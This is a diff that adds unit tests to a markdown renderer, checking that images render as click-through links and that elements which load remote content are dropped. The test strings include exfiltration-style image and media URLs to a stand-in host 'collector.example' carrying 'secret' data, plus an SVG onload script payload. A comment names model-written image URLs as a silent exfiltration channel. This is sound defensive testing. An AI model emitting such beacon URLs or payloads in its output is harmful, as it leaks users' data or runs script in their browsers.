@@ -75,6 +75,38 @@ describe('renderMarkdown', () => {
     expect(a?.getAttribute('href') ?? '').not.toContain('javascript:');
   });
 
+  it('renders a markdown image as a click-through link, never an auto-loading <img>', () => {
+    // An <img src> fires its GET the moment innerHTML inserts it, so a URL the
+    // model authored is a silent exfiltration channel (see markdown.ts).
+    const dom = intoDom('see ![](https://collector.example/beacon?d=secret)');
+    expect(dom.querySelector('img')).toBeNull();
+    const a = dom.querySelector('a');
+    expect(a?.getAttribute('href')).toBe('https://collector.example/beacon?d=secret');
+    expect(a?.getAttribute('rel')).toContain('noopener');
+  });
+
+  it('renders a non-http(s) image source as inert text', () => {
+    const dom = intoDom('<img src="data:image/svg+xml,<svg onload=alert(1)>" alt="pic">');
+    expect(dom.querySelector('img')).toBeNull();
+    expect(dom.querySelector('a')).toBeNull();
+    expect(dom.textContent).toContain('pic');
+  });
+
+  it('drops elements that load a remote subresource without a click', () => {
+    for (const md of [
+      '<video poster="https://collector.example/p?d=1"></video>',
+      '<svg><image href="https://collector.example/i?d=2"></image></svg>',
+      '<picture><source srcset="https://collector.example/s?d=3"></picture>',
+    ]) {
+      const html = renderMarkdown(md).toLowerCase();
+      expect(html).not.toContain('<video');
+      expect(html).not.toContain('<svg');
+      expect(html).not.toContain('<image');
+      expect(html).not.toContain('<source');
+      expect(html).not.toContain('collector.example');
+    }
+  });
+
   it('does not throw on partial/incomplete markdown (streaming-friendly)', () => {
     // half-typed table, unterminated bold, dangling fence, open link
     const partials = [
